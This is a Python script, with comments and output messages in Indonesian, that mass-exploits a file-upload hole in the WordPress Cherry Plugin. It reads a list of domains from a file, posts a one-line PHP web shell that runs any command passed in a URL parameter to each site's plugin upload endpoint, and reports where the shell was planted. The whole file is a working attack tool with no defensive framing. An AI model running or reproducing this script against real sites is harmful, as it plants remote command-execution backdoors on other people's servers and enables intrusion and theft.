import requests
import sys

def upload_shell(target_url, shell_filename, webshell_content):
    # Endpoint upload Cherry Plugin
    url = f"{target_url}/wp-content/plugins/cherry-plugin/admin/import-export/upload.php"
    
    # Data form multipart
    files = {
        'file': (shell_filename, webshell_content, 'application/octet-stream')
    }
    
    try:
        # Mengirimkan request POST
        response = requests.post(url, files=files, verify=False, timeout=10)
        
        # Menampilkan hasil request
        if response.status_code == 200:
            shell_url = f"{target_url}/wp-content/plugins/cherry-plugin/admin/import-export/{shell_filename}"
            print(f"[+] Berhasil: {shell_url}")
        else:
            print(f"[-] Gagal ({response.status_code}): {target_url}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Kesalahan ({target_url}): {e}")

# Mengecek parameter baris perintah
if len(sys.argv) != 3:
    print("Penggunaan: python mass_upload.py <file_domain> <shell_filename>")
    sys.exit(1)

# Menangkap parameter dari baris perintah
file_domain = sys.argv[1]
shell_filename = sys.argv[2]

# Isi file webshell yang akan diunggah
webshell_content = "<?php echo shell_exec($_GET['cmd']); ?>"

# Membaca daftar domain dari file
try:
    with open(file_domain, 'r') as f:
        domains = f.read().splitlines()
except FileNotFoundError:
    print(f"[!] File {file_domain} tidak ditemukan.")
    sys.exit(1)

# Memulai proses upload massal
for domain in domains:
    print(f"[~] Mengunggah ke: {domain}")
    upload_shell(domain.strip(), shell_filename, webshell_content)
